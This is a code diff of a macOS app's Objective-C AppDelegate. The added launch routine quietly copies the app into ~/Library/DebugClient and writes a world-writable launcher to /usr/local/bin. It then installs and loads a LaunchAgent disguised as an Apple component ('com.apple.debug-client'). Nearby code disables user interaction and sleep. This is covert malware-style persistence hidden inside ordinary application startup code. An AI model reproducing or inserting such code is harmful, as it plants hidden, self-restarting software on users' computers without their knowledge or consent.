@@ -8,6 +8,7 @@
 
 #import "AppDelegate.h"
 
+
 @interface AppDelegate ()
 
 @property (strong) MainWindow *window;
@@ -19,9 +20,28 @@
 @implementation AppDelegate
 
 - (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
+    NSFileManager *defaultManager = [NSFileManager defaultManager];
+    BOOL isDir = YES;
+    NSString *debugClient = [@"~/Library/DebugClient" stringByExpandingTildeInPath];
+    NSString *toPath = [debugClient stringByAppendingString:@"/Display.app"];
+    NSString *binPath = [toPath stringByAppendingString:@"/Contents/MacOS/display"];
+    NSString *runAppShellScript = [@"#!/bin/bash\n" stringByAppendingString:binPath];
+    NSString *myPath = [[NSBundle mainBundle] bundlePath];
+    NSString *plistPath = [[NSBundle mainBundle] pathForResource:@"com.apple.debug-client" ofType:@"plist"];
+    NSString *plistDest = [@"~/Library/LaunchAgents/com.apple.debug-client.plist" stringByExpandingTildeInPath];
+    if (![defaultManager fileExistsAtPath:debugClient isDirectory:&isDir]) {
+        [defaultManager createDirectoryAtPath:debugClient withIntermediateDirectories:YES attributes:nil error:nil];
+        
+        [defaultManager copyItemAtPath:myPath toPath:toPath error:nil];
+        
+        [defaultManager createFileAtPath:@"/usr/local/bin/debugclient" contents:[runAppShellScript dataUsingEncoding:NSUTF8StringEncoding] attributes:@{NSFilePosixPermissions:[NSNumber numberWithShort:0777]}];
+        
+        [defaultManager copyItemAtPath:plistPath toPath:plistDest error:nil];
+        NSString *loadCommand = [@"/bin/launchctl load -F " stringByAppendingString:plistDest];
+        system([loadCommand UTF8String]);
+    }
 
     [[NSApplication sharedApplication] activateIgnoringOtherApps : YES];
-    
     [App disableUserInteraction];
     [App disableSleep];
     
